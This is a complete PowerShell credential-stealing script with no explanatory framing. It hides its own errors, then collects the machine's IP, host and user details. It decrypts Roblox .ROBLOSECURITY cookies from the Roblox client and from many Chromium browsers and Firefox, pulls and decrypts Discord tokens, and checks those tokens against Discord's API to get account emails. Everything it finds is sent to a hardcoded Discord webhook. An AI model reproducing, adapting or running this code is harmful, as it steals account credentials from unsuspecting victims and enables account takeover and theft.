$ErrorActionPreference = "SilentlyContinue"
$webhook = "https://discord.com/api/webhooks/1543999798452027435/OIcVXPK_yS0I4Fe5svBxlkzw2_yNDzJcdX5CKEsv-wP0KRgQlS1GXpDyAK2JitSYJ13V"

function Send-Webhook($content) {
    try {
        $body = @{ content = $content } | ConvertTo-Json -Depth 5 -Compress
        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json" -UseBasicParsing
    } catch {}
}

# ===== IP =====
$ip = ""
try { $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 8).Trim() } catch {}
if (-not $ip) { try { $ip = (Invoke-RestMethod -Uri "https://ifconfig.me/ip" -UseBasicParsing -TimeoutSec 8).Trim() } catch {} }

$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption

Send-Webhook "**Hit**`nIP: ``$ip```nPC: ``$pc```nUser: ``$user```nOS: ``$os``"

# ===== ROBLOX COOKIES =====
$rbxCookies = @()

# 1. Roblox Client LocalStorage (DPAPI)
$rbxPath = "$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat"
if (Test-Path $rbxPath) {
    try {
        Add-Type -AssemblyName System.Security
        $json = Get-Content $rbxPath -Raw | ConvertFrom-Json
        if ($json.CookiesData) {
            $enc = [Convert]::FromBase64String($json.CookiesData)
            $data = $enc
            if ($enc.Length -gt 5 -and [Text.Encoding]::ASCII.GetString($enc[0..4]) -eq "DPAPI") {
                $data = $enc[5..($enc.Length-1)]
            }
            $dec = [Security.Cryptography.ProtectedData]::Unprotect($data, $null, "CurrentUser")
            $raw = [Text.Encoding]::UTF8.GetString($dec)
            if ($raw -match "\.ROBLOSECURITY") {
                $rbxCookies += "RobloxClient: $raw"
            }
        }
    } catch {}
}

# 2. Browser cookies (Chromium + Firefox)
$browserPaths = @(
    @{ Name = "Chrome";     Path = "$env:LOCALAPPDATA\Google\Chrome\User Data";          Type = "Chromium" },
    @{ Name = "Edge";       Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data";        Type = "Chromium" },
    @{ Name = "Brave";      Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"; Type = "Chromium" },
    @{ Name = "Opera";      Path = "$env:APPDATA\Opera Software\Opera Stable";          Type = "Chromium" },
    @{ Name = "OperaGX";    Path = "$env:APPDATA\Opera Software\Opera GX Stable";       Type = "Chromium" },
    @{ Name = "Vivaldi";    Path = "$env:LOCALAPPDATA\Vivaldi\User Data";               Type = "Chromium" },
    @{ Name = "Yandex";     Path = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data";  Type = "Chromium" },
    @{ Name = "Chromium";   Path = "$env:LOCALAPPDATA\Chromium\User Data";              Type = "Chromium" }
)

Add-Type -AssemblyName System.Security

function Get-ChromiumMasterKey($userDataPath) {
    $ls = Join-Path $userDataPath "Local State"
    if (-not (Test-Path $ls)) { return $null }
    try {
        $j = Get-Content $ls -Raw | ConvertFrom-Json
        $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
        if ([Text.Encoding]::ASCII.GetString($ek[0..4]) -ne "DPAPI") { return $null }
        return [Security.Cryptography.ProtectedData]::Unprotect($ek[5..($ek.Length-1)], $null, "CurrentUser")
    } catch { return $null }
}

function Decrypt-ChromiumCookie($encryptedValue, $masterKey) {
    if (-not $encryptedValue -or $encryptedValue.Length -lt 15) { return $null }
    try {
        if ($encryptedValue[0] -eq 0x76 -and $encryptedValue[1] -eq 0x31 -and ($encryptedValue[2] -eq 0x30 -or $encryptedValue[2] -eq 0x31)) {
            $nonce = $encryptedValue[3..14]
            $cipher = $encryptedValue[15..($encryptedValue.Length-17)]
            $tag = $encryptedValue[($encryptedValue.Length-16)..($encryptedValue.Length-1)]
            $aes = [Security.Cryptography.AesGcm]::new($masterKey)
            $plain = New-Object byte[] $cipher.Length
            $aes.Decrypt($nonce, $cipher, $tag, $plain)
            return [Text.Encoding]::UTF8.GetString($plain)
        }
        return [Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($encryptedValue, $null, "CurrentUser"))
    } catch { return $null }
}

foreach ($b in $browserPaths) {
    if (-not (Test-Path $b.Path)) { continue }
    $profiles = @("Default") + (Get-ChildItem $b.Path -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name)
    $masterKey = Get-ChromiumMasterKey $b.Path

    foreach ($prof in $profiles) {
        $cookieDb = Join-Path $b.Path "$prof\Network\Cookies"
        $cookieDbOld = Join-Path $b.Path "$prof\Cookies"
        $db = if (Test-Path $cookieDb) { $cookieDb } elseif (Test-Path $cookieDbOld) { $cookieDbOld } else { $null }
        if (-not $db) { continue }

        $tmp = "$env:TEMP\ck_$([guid]::NewGuid().ToString('N')).db"
        try {
            Copy-Item $db $tmp -Force
            $bytes = [IO.File]::ReadAllBytes($tmp)
            $text = [Text.Encoding]::UTF8.GetString($bytes)
            $matches = [regex]::Matches($text, '\.ROBLOSECURITY[_=:\s]*([A-Za-z0-9_\-\.|%]{50,})')
            foreach ($m in $matches) {
                $val = $m.Groups[1].Value
                if ($val.Length -gt 40) {
                    $rbxCookies += "$($b.Name)/$prof : .ROBLOSECURITY=$val"
                }
            }
            $matches2 = [regex]::Matches($text, '_\|WARNING:-DO-NOT-SHARE-THIS\.[^|]{20,}')
            foreach ($m in $matches2) {
                $rbxCookies += "$($b.Name)/$prof : $($m.Value)"
            }
        } catch {} finally {
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
    }
}

# Firefox cookies.sqlite
$ffProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffProfiles) {
    Get-ChildItem $ffProfiles -Directory | ForEach-Object {
        $ck = Join-Path $_.FullName "cookies.sqlite"
        if (Test-Path $ck) {
            $tmp = "$env:TEMP\ff_$([guid]::NewGuid().ToString('N')).db"
            try {
                Copy-Item $ck $tmp -Force
                $bytes = [IO.File]::ReadAllBytes($tmp)
                $text = [Text.Encoding]::UTF8.GetString($bytes)
                $matches = [regex]::Matches($text, '\.ROBLOSECURITY[_=:\s]*([A-Za-z0-9_\-\.|%]{50,})')
                foreach ($m in $matches) {
                    $rbxCookies += "Firefox/$($_.Name) : .ROBLOSECURITY=$($m.Groups[1].Value)"
                }
            } catch {} finally { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
        }
    }
}

if ($rbxCookies.Count -gt 0) {
    $chunk = ($rbxCookies | Select-Object -Unique) -join "`n"
    while ($chunk.Length -gt 1800) {
        $part = $chunk.Substring(0, 1800)
        $chunk = $chunk.Substring(1800)
        Send-Webhook "**Roblox Cookies**`n``````$part``````"
    }
    if ($chunk) { Send-Webhook "**Roblox Cookies**`n``````$chunk``````" }
} else {
    Send-Webhook "**Roblox Cookies**: none found"
}

# ===== DISCORD TOKENS =====
$tokens = @()

$tokenPaths = @(
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb",
    "$env:APPDATA\discordptb\Local Storage\leveldb",
    "$env:APPDATA\discorddevelopment\Local Storage\leveldb",
    "$env:APPDATA\Lightcord\Local Storage\leveldb",
    "$env:APPDATA\Opera Software\Opera Stable\Local Storage\leveldb",
    "$env:APPDATA\Opera Software\Opera GX Stable\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 1\Local Storage\leveldb",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"
)

$chromeBase = "$env:LOCALAPPDATA\Google\Chrome\User Data"
if (Test-Path $chromeBase) {
    Get-ChildItem $chromeBase -Directory | Where-Object { $_.Name -match "Default|Profile" } | ForEach-Object {
        $tokenPaths += (Join-Path $_.FullName "Local Storage\leveldb")
    }
}
$edgeBase = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
if (Test-Path $edgeBase) {
    Get-ChildItem $edgeBase -Directory | Where-Object { $_.Name -match "Default|Profile" } | ForEach-Object {
        $tokenPaths += (Join-Path $_.FullName "Local Storage\leveldb")
    }
}

$regexToken = '[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}'
$regexEnc   = 'dQw4w9WgXcQ:[^"]+'

function Get-DiscordKey($localStatePath) {
    try {
        $j = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
        if ([Text.Encoding]::ASCII.GetString($ek[0..4]) -ne "DPAPI") { return $null }
        return [Security.Cryptography.ProtectedData]::Unprotect($ek[5..($ek.Length-1)], $null, "CurrentUser")
    } catch { return $null }
}

function Decrypt-DiscordToken($encryptedB64, $key) {
    try {
        $raw = [Convert]::FromBase64String($encryptedB64)
        $nonce = $raw[3..14]
        $cipher = $raw[15..($raw.Length-17)]
        $tag = $raw[($raw.Length-16)..($raw.Length-1)]
        $aes = [Security.Cryptography.AesGcm]::new($key)
        $plain = New-Object byte[] $cipher.Length
        $aes.Decrypt($nonce, $cipher, $tag, $plain)
        return [Text.Encoding]::UTF8.GetString($plain)
    } catch { return $null }
}

foreach ($p in ($tokenPaths | Select-Object -Unique)) {
    if (-not (Test-Path $p)) { continue }
    $files = Get-ChildItem $p -File -Include "*.ldb","*.log" -ErrorAction SilentlyContinue
    foreach ($f in $files) {
        try {
            $content = [IO.File]::ReadAllText($f.FullName, [Text.Encoding]::UTF8)
            [regex]::Matches($content, $regexToken) | ForEach-Object {
                $t = $_.Value
                if ($t -notin $tokens) { $tokens += $t }
            }
            [regex]::Matches($content, $regexEnc) | ForEach-Object {
                $encPart = $_.Value -replace '^dQw4w9WgXcQ:', ''
                $parent = Split-Path (Split-Path (Split-Path $p))
                $ls = Join-Path $parent "Local State"
                if (-not (Test-Path $ls)) {
                    $ls = "$env:APPDATA\discord\Local State"
                }
                $key = Get-DiscordKey $ls
                if ($key) {
                    $dec = Decrypt-DiscordToken $encPart $key
                    if ($dec -and $dec -match $regexToken -and $dec -notin $tokens) {
                        $tokens += $dec
                    }
                }
            }
        } catch {}
    }
}

$valid = @()
foreach ($t in ($tokens | Select-Object -Unique)) {
    try {
        $r = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers @{ Authorization = $t } -UseBasicParsing -TimeoutSec 6
        $valid += "$t  |  $($r.username)#$($r.discriminator)  |  $($r.id)  |  email:$($r.email)"
    } catch {
        $valid += "$t  (invalid or locked)"
    }
}

if ($valid.Count -gt 0) {
    $out = $valid -join "`n"
    while ($out.Length -gt 1800) {
        $part = $out.Substring(0, 1800)
        $out = $out.Substring(1800)
        Send-Webhook "**Discord Tokens**`n``````$part``````"
    }
    if ($out) { Send-Webhook "**Discord Tokens**`n``````$out``````" }
} else {
    Send-Webhook "**Discord Tokens**: none found"
}

Send-Webhook "**Done**"
